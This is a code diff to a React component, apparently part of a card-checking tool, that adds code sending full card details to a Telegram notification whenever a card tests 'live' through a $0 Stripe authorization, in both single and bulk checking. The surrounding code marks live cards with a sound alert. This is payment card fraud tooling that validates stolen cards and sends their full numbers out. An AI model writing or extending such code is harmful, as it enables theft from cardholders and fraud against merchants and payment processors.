@@ -970,6 +970,27 @@ const Gateways = () => {
         }
       }
 
+      // Send Telegram notification for STRIPE AUTH checks (LIVE ONLY)
+      if (selectedGateway.id === "stripe_auth" && gatewayResponse && checkStatus === "live") {
+        try {
+          const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
+          
+          await supabase.functions.invoke('notify-charged-card', {
+            body: {
+              user_id: userId,
+              card_details: fullCardString,
+              status: "CHARGED",
+              response_message: realResponseMessage,
+              amount: "$0 Auth",
+              gateway: "YUNCHI AUTH 1",
+              api_response: gatewayResponse.rawResponse
+            }
+          });
+        } catch (notifyError) {
+          console.log("Failed to send Telegram notification:", notifyError);
+        }
+      }
+
       if (checkResult.status === "live") {
         // Play live card sound if enabled
         playLiveSoundIfEnabled();
@@ -1655,6 +1676,27 @@ const Gateways = () => {
                 response_message: realResponseMessage,
                 amount: "$0 Auth",
                 gateway: "YUNCHI AUTH 3",
+                api_response: gatewayResponse.rawResponse
+              }
+            });
+          } catch (notifyError) {
+            console.log("Failed to send Telegram notification:", notifyError);
+          }
+        }
+
+        // Send Telegram notification for STRIPE AUTH checks (LIVE ONLY) in bulk
+        if (selectedGateway.id === "stripe_auth" && gatewayResponse && checkStatus === "live") {
+          try {
+            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
+            
+            await supabase.functions.invoke('notify-charged-card', {
+              body: {
+                user_id: userId,
+                card_details: fullCardStr,
+                status: "CHARGED",
+                response_message: realResponseMessage,
+                amount: "$0 Auth",
+                gateway: "YUNCHI AUTH 1",
                 api_response: gatewayResponse.rawResponse
               }
             });
